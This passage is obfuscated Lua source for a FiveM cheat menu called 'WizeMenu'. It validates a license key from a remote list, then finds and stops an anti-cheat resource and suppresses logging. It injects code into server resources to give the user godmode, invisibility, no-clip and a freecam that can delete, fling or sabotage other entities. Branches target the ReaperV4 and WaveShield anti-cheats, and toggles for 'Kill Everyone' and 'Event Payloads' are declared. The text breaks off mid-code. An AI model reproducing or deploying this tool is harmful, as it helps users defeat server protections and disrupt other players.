local v0="https://raw.githack.com/WM5M/test/refs/heads/main/wmk.json";local v1=MachoWebRequest(v0);local v2=MachoAuthenticationKey();local v3=true;local function v4(v73) local v74=0;local v75;local v76;local v77;local v78;local v79;local v80;while true do if (v74==(1 -0)) then if  not v75 then return nil;end return (tonumber(os_time) or 0) + (0 -0) ;end if (v74==(1205 -(902 + 303))) then if (type(v73)~="string") then return nil;end v75,v76,v77,v78,v79,v80=string.match(v73,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v74=1 -0 ;end end end local function v5() local v81=0 -0 ;local v82;while true do if (v81==(0 + 0)) then v82=GetCloudTimeAsInt();if (v82 and (v82>(1690 -(1121 + 569)))) then return v82;end v81=215 -(22 + 192) ;end if (v81==(684 -(483 + 200))) then return 1463 -(1404 + 59) ;end end end local function v6(v83) local v84,v85,v86,v87,v88,v89=string.match(v83,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v84 then return nil;end local v90=((tonumber(v84) -(5391 -3421)) * (490 -125)) + math.floor((tonumber(v84) -(2734 -(468 + 297)))/(566 -(334 + 228)) ) + ((tonumber(v85) -(3 -2)) * (69 -39)) + tonumber(v86 or (1 -0) ) ;local v91=(v90 * (24535 + 61865)) + (tonumber(v87 or 0 ) * (3836 -(141 + 95))) + (tonumber(v88 or 0 ) * 60) + tonumber(v89 or (0 + 0) ) ;return v91;end local function v7() local v92=0 -0 ;local v93;local v94;local v95;while true do if (1==v92) then if ( not v93 or  not v94 or (type(v94)~="table")) then return false,"Key list invalid";end v95=v5();v92=2;end if (v92==0) then if  not v1 then return false,"No key list available";end v93,v94=pcall(json.decode,v1);v92=1;end if (v92==(4 -2)) then for v307,v308 in ipairs(v94) do if ((type(v308)=="table") and (v308.key==v2)) then if (v308.expires and (type(v308.expires)=="string")) then local v391=0 + 0 ;local v392;while true do if (v391==0) then v392=v6(v308.expires);if  not v392 then return false,"Bad expiry format";end v391=2 -1 ;end if (v391==(1 + 0)) then if (v392>v95) then return true,"Key valid (not expired)",v392;else return false,"Key expired",v392;end break;end end elseif v3 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end end end local v8,v9,v10=v7();if  not v8 then local v260=0 + 0 ;while true do if (v260==0) then MachoMenuNotification("WizeMenu","Invalid key: "   .. tostring(v2)   .. " ("   .. tostring(v9)   .. ")" ,14 -4 );return;end end end Citizen.CreateThread(function() if (v10 and (v10>(0 + 0))) then local v287=0;local v288;local v289;while true do if (v287==(163 -(92 + 71))) then v288=v5();v289=v10-v288 ;v287=1 + 0 ;end if (v287==(1 -0)) then if (v289>(765 -(574 + 191))) then local v377=math.floor(v289/(71269 + 15131) );local v378=math.floor((v289%86400)/(9019 -5419) );local v379=string.format("Key valid. Expires in %d days and %d hours.",v377,v378);MachoMenuNotification("WizeMenu",v379,3 + 2 );else MachoMenuNotification("WizeMenu","Key expired.",859 -(254 + 595) );end break;end end else MachoMenuNotification("WizeMenu","Key valid (no expiry field).",5);end end);local v11=vec2(750,500);local v12=vec2(626 -(55 + 71) ,658 -158 );local v13=150;local v14=10;local v15=1805 -(573 + 1217) ;local v16=v11.x-v13 ;local v17=v11.y-(2 * v14) ;local v18=(v16-(v14 * (8 -5)))/2 ;local v19=(v17-(v14 * 3))/(1 + 1) ;local v20=MachoMenuTabbedWindow("WizeVIP",v12.x,v12.y,v11.x,v11.y,v13);MachoMenuSetKeybind(v20,33);MachoMenuSetAccent(v20,332 -125 ,955 -(714 + 225) ,93 -61 );MachoMenuText(v20,"YT @JayThaaGamer");local v21=MachoMenuAddTab(v20,"Self");local v22=MachoMenuAddTab(v20,"Server");local v23=MachoMenuAddTab(v20,"Teleport");local v24=MachoMenuAddTab(v20,"Weapon");local v25=MachoMenuAddTab(v20,"Vehicle");local v26=MachoMenuAddTab(v20,"Animations");local v27=MachoMenuAddTab(v20,"Triggers");local v28=MachoMenuAddTab(v20,"Settings");local v29=MachoMenuAddTab(v20,"VIP");local function v30(v96) local v97=0;local v98;local v99;local v100;local v101;local v102;local v103;local v104;local v105;while true do if (v97==(2 -0)) then v102=(v19 * 2) + v14 ;v103=MachoMenuGroup(v96,"Self",v98,v99,v98 + v18 ,v99 + v102 );v97=1 + 2 ;end if (3==v97) then v104=MachoMenuGroup(v96,"Model Changer",v101,v99,v101 + v18 ,v99 + v19 );v105=MachoMenuGroup(v96,"Functions",v101,v100,v101 + v18 ,v100 + v19 );v97=5 -1 ;end if (v97==1) then v100=v99 + v19 + v14 ;v101=v98 + v18 + v14 ;v97=808 -(118 + 688) ;end if (v97==(52 -(25 + 23))) then return v103,v104,v105;end if (v97==(0 + 0)) then v98=v13 + v14 ;v99=v14 + v15 ;v97=1;end end end local function v31(v106) local v107=1886 -(927 + 959) ;local v108;local v109;local v110;local v111;local v112;local v113;local v114;while true do if ((3 -2)==v107) then v110=v109 + v108 ;v111=MachoMenuGroup(v106,"Player",v109,v14 + v15 ,v110,v17);v107=2;end if (v107==(734 -(16 + 716))) then v112=v110 + v14 ;v113=v112 + v108 ;v107=5 -2 ;end if (v107==(97 -(11 + 86))) then v108=(v16-(v14 * (6 -3)))/(287 -(175 + 110)) ;v109=v13 + v14 ;v107=1;end if (v107==(6 -3)) then v114=MachoMenuGroup(v106,"Everyone",v112,v14 + v15 ,v113,v17);return v111,v114;end end end local function v32(v115) local v116=0;local v117;local v118;local v119;local v120;local v121;local v122;local v123;while true do if (v116==(9 -7)) then v121=v119 + v14 ;v122=v121 + v117 ;v116=3;end if (v116==0) then v117=(v16-(v14 * (1799 -(503 + 1293))))/(5 -3) ;v118=v13 + v14 ;v116=1 + 0 ;end if (v116==1) then v119=v118 + v117 ;v120=MachoMenuGroup(v115,"Teleport",v118,v14 + v15 ,v119,v17);v116=2;end if (v116==(1064 -(810 + 251))) then v123=MachoMenuGroup(v115,"Other",v121,v14 + v15 ,v122,v17);return v120,v123;end end end local function v33(v124) local v125=0 + 0 ;local v126;local v127;local v128;local v129;local v130;local v131;local v132;while true do if (v125==(1 + 1)) then v130=MachoMenuGroup(v124,"Spawner",v126,v128,v126 + v18 ,v128 + v19 );v131=v126 + v18 + v14 ;v125=3 + 0 ;end if (v125==(534 -(43 + 490))) then v128=v127 + v19 + v14 ;v129=MachoMenuGroup(v124,"Mods",v126,v127,v126 + v18 ,v127 + v19 );v125=735 -(711 + 22) ;end if (v125==(0 -0)) then v126=v13 + v14 ;v127=v14 + v15 ;v125=860 -(240 + 619) ;end if (v125==3) then v132=MachoMenuGroup(v124,"Other",v131,v14 + v15 ,v131 + v18 ,v17);return v129,v130,v132;end end end local function v34(v133) local v134=0;local v135;local v136;local v137;local v138;local v139;local v140;local v141;while true do if (v134==(1 + 1)) then v139=MachoMenuGroup(v133,"Plate & Spawning",v135,v137,v135 + v18 ,v137 + v19 );v140=v135 + v18 + v14 ;v134=3;end if (v134==(0 -0)) then v135=v13 + v14 ;v136=v14 + v15 ;v134=1 + 0 ;end if (v134==(1745 -(1344 + 400))) then v137=v136 + v19 + v14 ;v138=MachoMenuGroup(v133,"Mods",v135,v136,v135 + v18 ,v136 + v19 );v134=2;end if (v134==3) then v141=MachoMenuGroup(v133,"Other",v140,v14 + v15 ,v140 + v18 ,v17);return v138,v139,v141;end end end local function v35(v142) local v143=0;local v144;local v145;local v146;local v147;local v148;local v149;local v150;while true do if (v143==(408 -(255 + 150))) then v150=MachoMenuGroup(v142,"Force Emotes",v148,v14 + v15 ,v149,v17);return v147,v150;end if (v143==(2 + 0)) then v148=v146 + v14 ;v149=v148 + v144 ;v143=2 + 1 ;end if (v143==(0 -0)) then v144=(v16-(v14 * 3))/(6 -4) ;v145=v13 + v14 ;v143=1;end if (v143==(1740 -(404 + 1335))) then v146=v145 + v144 ;v147=MachoMenuGroup(v142,"Animations",v145,v14 + v15 ,v146,v17);v143=408 -(183 + 223) ;end end end local function v36(v151) local v152=0 -0 ;local v153;local v154;local v155;local v156;local v157;local v158;local v159;local v160;while true do if (v152==(1 + 0)) then v155=v154 + v19 + v14 ;v156=MachoMenuGroup(v151,"Item Spawner",v153,v155,v153 + v18 ,v154 + v19 );v152=2;end if (0==v152) then v153=v13 + v14 ;v154=v14 + v15 ;v152=1 + 0 ;end if (v152==(341 -(10 + 327))) then return v156,v157,v159,v160;end if (v152==2) then v157=MachoMenuGroup(v151,"Money Spawner",v153,v154,v153 + v18 ,v154 + v19 );v158=v153 + v18 + v14 ;v152=3 + 0 ;end if (v152==(341 -(118 + 220))) then v159=MachoMenuGroup(v151,"Common Exploits",v158,v154,v158 + v18 ,v154 + v19 );v160=MachoMenuGroup(v151,"Event Payloads",v158,v155,v158 + v18 ,v155 + v19 );v152=2 + 2 ;end end end local function v37(v161) local v162=v13 + v14 ;local v163=v14 + v15 ;local v164=v163 + v19 + v14 ;local v165=MachoMenuGroup(v161,"Trigger Finder Spawner",v162,v163,v162 + v18 ,v163 + v19 );local v166=MachoMenuGroup(v161,"Common Exploits",v162,v164,v162 + v18 ,v164 + v19 );local v167=v162 + v18 + v14 ;local v168=MachoMenuGroup(v161,"Common Exploits V2",v167,v14 + v15 ,v167 + v18 ,v17);return v165,v166,v168;end local function v38(v169) local v170=449 -(108 + 341) ;local v171;local v172;local v173;local v174;local v175;local v176;local v177;while true do if (v170==2) then v175=MachoMenuGroup(v169,"Menu Design",v171,v173,v171 + v18 ,v173 + v19 );v176=v171 + v18 + v14 ;v170=3;end if ((1 + 0)==v170) then v173=v172 + v19 + v14 ;v174=MachoMenuGroup(v169,"Stop",v171,v172,v171 + v18 ,v172 + v19 );v170=8 -6 ;end if (v170==3) then v177=MachoMenuGroup(v169,"Server Settings",v176,v14 + v15 ,v176 + v18 ,v17);return v174,v175,v177;end if (v170==(1493 -(711 + 782))) then v171=v13 + v14 ;v172=v14 + v15 ;v170=1 -0 ;end end end local v39={v30(v21)};local v40={v31(v22)};local v41={v32(v23)};local v42={v33(v24)};local v43={v34(v25)};local v44={v35(v26)};local v45={v36(v27)};local v46={v37(v29)};local v47={v38(v28)};local function v48(v178) return GetResourceState(v178)=="started" ;end local function v49() local v179=0;local v180;local v181;local v182;while true do if (v179==(1 + 0)) then v180=nil;function v180() local v309=0;local v310;local v311;local v312;while true do if (v309==(4 -2)) then for v393=0,v312-1  do local v394=0;local v395;while true do if (v394==0) then v395=GetResourceByFindIndex(v393);if v310(v395,v311) then return true,v395;end break;end end end return false,nil;end if (v309==(1 + 0)) then v311="ai_module_fg-obfuscated.lua";v312=GetNumResources();v309=1169 -(645 + 522) ;end if (v309==0) then v310=nil;function v310(v396,v397) local v398=LoadResourceFile(v396,v397);return v398~=nil ;end v309=1;end end end Wait(1890 -(1010 + 780) );v179=2 + 0 ;end if (v179==(0 -0)) then Wait(4395 -2895 );Wait(100);MachoMenuNotification("[NOTIFICATION] WizeMenu","Bypassing FiveTard.");v179=1;end if (v179==3) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Almost done.");Wait(2336 -(1045 + 791) );MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished Enjoy.");break;end if (v179==(4 -2)) then v181,v182=v180();if (v181 and v182) then MachoResourceStop(v182);end Wait(152 -52 );v179=508 -(351 + 154) ;end end end v49();local v50;if (GetResourceState("qbx_core")=="started") then v50="qbx_core";elseif (GetResourceState("es_extended")=="started") then v50="es_extended";elseif (GetResourceState("qb-core")=="started") then v50="qb-core";else v50="any";end Citizen.CreateThread(function() MachoMenuNotification("[NOTIFICATION] WizeMenu","Spawn Shit Now!");Wait(500);MachoMenuNotification("[NOTIFICATION] WizeMenu","O_o!");end);MachoLockLogger();MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
        local xJdRtVpNzQmKyLf = false -- Free Camera
    ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
        Unloaded = false
        local aXfPlMnQwErTyUi = false -- Godmode
        local sRtYuIoPaSdFgHj = false -- Invisibility
        local mKjHgFdSaPlMnBv = false -- No Ragdoll
        local uYtReWqAzXcVbNm = false -- Infinite Stamina
        local peqCrVzHDwfkraYZ = false -- Shrink Ped
        local NpYgTbUcXsRoVm = false -- No Clip
        local xCvBnMqWeRtYuIo = false -- Super Jump
        local nxtBFlQWMMeRLs = false -- Levitation
        local fgawjFmaDjdALaO = false -- Super Strength
        local qWeRtYuIoPlMnBv = false -- Super Punch
        local zXpQwErTyUiPlMn = false -- Throw From Vehicle
        local kJfGhTrEeWqAsDz = false -- Force Third Person
        local zXcVbNmQwErTyUi = false -- Force Driveby
        local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
        local nHgFdSaZxCvBnMq = false -- Anti-Freeze
        local fAwjeldmwjrWkSf = false -- Anti-TP
        local aDjsfmansdjwAEl = false -- Anti-Blackscreen
        local qWpEzXvBtNyLmKj = false -- Crosshair

        local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
        local LkJgFdSaQwErTy = false -- Infinite Ammo
        local QzWxEdCvTrBnYu = false -- Explosive Ammo
        local RfGtHyUjMiKoLp = false -- One Shot Kill 

        local zXcVbNmQwErTyUi = false -- Vehicle Godmode
        local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
        local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
        local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
        local NuRqVxEyKiOlZm = false -- Vehicle Hop
        local GxRpVuNzYiTq = false -- Rainbow Vehicle
        local MqTwErYuIoLp = false -- Drift Mode
        local NvGhJkLpOiUy = false -- Easy Handling
        local VkLpOiUyTrEq = false -- Instant Breaks
        local BlNkJmLzXcVb = false -- Unlimited Fuel

        local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
        local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
        local tUOgshhvIaku = false -- RPG Kill Everyone
        local zXcVbNmQwErTyUi = false -- 
    ]]);MachoMenuCheckbox(v39[1575 -(1281 + 293) ],"Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
            aXfPlMnQwErTyUi = true

            local function OxWJ1rY9vB()
                local fLdRtYpLoWqEzXv = CreateThread
                fLdRtYpLoWqEzXv(function()
                    while aXfPlMnQwErTyUi and not Unloaded do
                        local dOlNxGzPbTcQ = PlayerPedId()
                        local rKsEyHqBmUiW = PlayerId()

                        if GetResourceState("ReaperV4") == "started" then
                            local kcWsWhJpCwLI = SetPlayerInvincible
                            local ByTqMvSnAzXd = SetEntityInvincible
                            kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                            ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                        elseif GetResourceState("WaveShield") == "started" then
                            local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                            cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                        else
                            local BiIqUJHexRrR = SetEntityCanBeDamaged
                            local UtgGRNyiPhOs = SetEntityProofs
                            local rVuKoDwLsXpC = SetEntityInvincible

                            BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                            UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                            rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                        end

                        Wait(0)
                    end
                end)
            end

            OxWJ1rY9vB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aXfPlMnQwErTyUi = false

            local dOlNxGzPbTcQ = PlayerPedId()
            local rKsEyHqBmUiW = PlayerId()

            if GetResourceState("ReaperV4") == "started" then
                local kcWsWhJpCwLI = SetPlayerInvincible
                local ByTqMvSnAzXd = SetEntityInvincible

                kcWsWhJpCwLI(rKsEyHqBmUiW, false)
                ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

            elseif GetResourceState("WaveShield") == "started" then
                local AilJsyZTXnNc = SetEntityCanBeDamaged
                AilJsyZTXnNc(dOlNxGzPbTcQ, true)

            else
                local tBVAZMubUXmO = SetEntityCanBeDamaged
                local yuTiZtxOXVnE = SetEntityProofs
                local rVuKoDwLsXpC = SetEntityInvincible

                tBVAZMubUXmO(dOlNxGzPbTcQ, true)
                yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
                rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
            end
        ]]);end);MachoMenuCheckbox(v39[1],"Invisibility",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local function d2NcWoyTfb()
                if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                sRtYuIoPaSdFgHj = true

                local zXwCeVrBtNuMyLk = CreateThread
                zXwCeVrBtNuMyLk(function()
                    while sRtYuIoPaSdFgHj and not Unloaded do
                        local uYiTpLaNmZxCwEq = SetEntityVisible
                        local hGfDrEsWxQaZcVb = PlayerPedId()
                        uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                        Wait(0)
                    end

                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                end)
            end

            d2NcWoyTfb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            sRtYuIoPaSdFgHj = false

            local function tBKM4syGJL()
                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end

            tBKM4syGJL()
        ]]);end);MachoMenuCheckbox(v39[267 -(28 + 238) ],"No Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
            mKjHgFdSaPlMnBv = true

            local function jP7xUrK9Ao()
                local zVpLyNrTmQxWsEd = CreateThread
                zVpLyNrTmQxWsEd(function()
                    while mKjHgFdSaPlMnBv and not Unloaded do
                        local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                        oPaSdFgHiJkLzXc(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            jP7xUrK9Ao()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            mKjHgFdSaPlMnBv = false
        ]]);end);MachoMenuCheckbox(v39[2 -1 ],"Infinite Stamina",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
            uYtReWqAzXcVbNm = true

            local function YLvd3pM0tB()
                local tJrGyHnMuQwSaZx = CreateThread
                tJrGyHnMuQwSaZx(function()
                    while uYtReWqAzXcVbNm and not Unloaded do
                        local aSdFgHjKlQwErTy = RestorePlayerStamina
                        local rTyUiEaOpAsDfGhJk = PlayerId()
                        aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                        Wait(0)
                    end
                end)
            end

            YLvd3pM0tB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            uYtReWqAzXcVbNm = false
        ]]);end);MachoMenuCheckbox(v39[1560 -(1381 + 178) ],"Tiny Ped",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
            peqCrVzHDwfkraYZ = true

            local function YfeemkaufrQjXTFY()
                local OLZACovzmAvgWPmC = CreateThread
                OLZACovzmAvgWPmC(function()
                    while peqCrVzHDwfkraYZ and not Unloaded do
                        local aukLdkvEinBsMWuA = SetPedConfigFlag
                        aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                        Wait(0)
                    end
                end)
            end

            YfeemkaufrQjXTFY()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            peqCrVzHDwfkraYZ = false
            local aukLdkvEinBsMWuA = SetPedConfigFlag
            aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"No Clip",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
            NpYgTbUcXsRoVm = true

            local function KUQpH7owdz()
                local RvBcNxMzKgUiLo = PlayerPedId
                local EkLpOiUhYtGrFe = GetVehiclePedIsIn
                local CtVbXnMzQaWsEd = GetEntityCoords
                local DrTgYhUjIkOlPm = GetEntityHeading
                local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
                local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
                local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
                local TyUiOpAsDfGhJk = IsDisabledControlPressed
                local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
                local PlMnBvCxZaSdFg = SetEntityHeading
                local HnJmKlPoIuYtRe = CreateThread

                local YtReWqAzXsEdCv = false

                HnJmKlPoIuYtRe(function()
                    while NpYgTbUcXsRoVm and not Unloaded do
                        Wait(0)

                        if JkLzXcVbNmAsDf(0, 303) then
                            YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                        end

                        if YtReWqAzXsEdCv then
                            local speed = 2.0

                            local p = RvBcNxMzKgUiLo()
                            local v = EkLpOiUhYtGrFe(p, false)
                            local inVeh = v ~= 0 and v ~= nil
                            local ent = inVeh and v or p

                            local pos = CtVbXnMzQaWsEd(ent, true)
                            local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                            local pitch = AoSdFgHjKlZxCv()

                            local dx = -math.sin(math.rad(head))
                            local dy = math.cos(math.rad(head))
                            local dz = math.sin(math.rad(pitch))
                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                            if len ~= 0 then
                                dx, dy, dz = dx / len, dy / len, dz / len
                            end

                            if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                            if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                            if TyUiOpAsDfGhJk(0, 32) then
                                pos = pos + vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 34) then
                                pos = pos + vector3(-dy, dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 269) then
                                pos = pos - vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 9) then
                                pos = pos + vector3(dy, -dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 22) then
                                pos = pos + vector3(0.0, 0.0, speed)
                            end
                            if TyUiOpAsDfGhJk(0, 36) then
                                pos = pos - vector3(0.0, 0.0, speed)
                            end

                            WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                            PlMnBvCxZaSdFg(ent, head)
                        end
                    end
                    YtReWqAzXsEdCv = false
                end)
            end

            KUQpH7owdz()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NpYgTbUcXsRoVm = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Free Camera",function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            
            g_FreecamFeatureEnabled = true
            
            local function initializeFreecam()
                -- Script State
                local isFreecamActive = false
                local freecamHandle = nil
                local targetCoords, targetEntity = nil, nil
                local currentFeatureIndex = 1

                -- NEW FEATURE: Ped Spawning State
                local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
                local currentPedIndex = 1

                local stopFreecam, startFreecam

                -- Feature Definitions (Now with Ped Spawner)
                local Features = { 
                    "Look-Around", 
                    "Spawn Ped",         -- ADDED
                    "Teleport", 
                    "Delete Entity", 
                    "Fling Entity", 
                    "Flip Vehicle", 
                    "Launch Vehicle",
                    "Teleport Vehicle",
                    "Mess With Vehicle"
                }

                -- Helper Function for Drawing Text
                local function drawText(content, x, y, options)
                    SetTextFont(options.font or 4)
                    SetTextScale(0.0, options.scale or 0.3)
                    SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                    SetTextOutline()
                    if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                    SetTextCentre(true)
                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName(content)
                    EndTextCommandDisplayText(x, y)
                end

                -- Main Draw Thread (UI Only)
                local function drawThread()
                    while isFreecamActive do
                        Wait(0)
                        -- Draw Crosshair
                        drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                        
                        -- ##### UI FIX: SCROLLING MENU LOGIC #####
                        local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                        local numFeatures = #Features
                        local startIdx, endIdx = 1, numFeatures

                        if numFeatures > ui.maxVisible then
                            startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                            endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                            if endIdx == numFeatures then
                                startIdx = numFeatures - ui.maxVisible + 1
                            end
                        end

                        -- Draw a counter above the list
                        drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                        local displayCount = 0
                        for i = startIdx, endIdx do
                            local featureName = Features[i]
                            local isSelected = (i == currentFeatureIndex)
                            local lineY = ui.y + (displayCount * ui.lineHeight)
                            if isSelected then
                                drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                            else
                                drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                            end
                            displayCount = displayCount + 1
                        end
                    end
                end

                -- Main Input and Logic Thread
                local function logicThread()
                    while isFreecamActive do
                        Wait(0)
                        if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                        
                        if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                            local currentFeature = Features[currentFeatureIndex]
                            if currentFeature == "Teleport" and targetCoords then
                                local ped = PlayerPedId()
                                local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                                SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                            -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                            elseif currentFeature == "Spawn Ped" and targetCoords then
                                local model = pedsToSpawn[currentPedIndex]
                                CreateThread(function()
                                    local modelHash = GetHashKey(model)
                                    RequestModel(modelHash)
                                    local timeout = 2000 -- 2 second timeout for model loading
                                    while not HasModelLoaded(modelHash) and timeout > 0 do
                                        Wait(100)
                                        timeout = timeout - 100
                                    end
                                    if HasModelLoaded(modelHash) then
                                        local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                        local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                        local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                        SetModelAsNoLongerNeeded(modelHash)
                                        TaskStandStill(newPed, -1) -- Make them stand still
                                        currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                    end
                                end)
                            elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                                SetEntityAsMissionEntity(targetEntity, true, true)
                                DeleteEntity(targetEntity)
                            elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                                ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                SetVehicleOnGroundProperly(targetEntity)
                            elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local currentCoords = GetEntityCoords(targetEntity)
                                local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                                SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                            elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                local actions = {
                                    function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                    function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                    function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                    function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
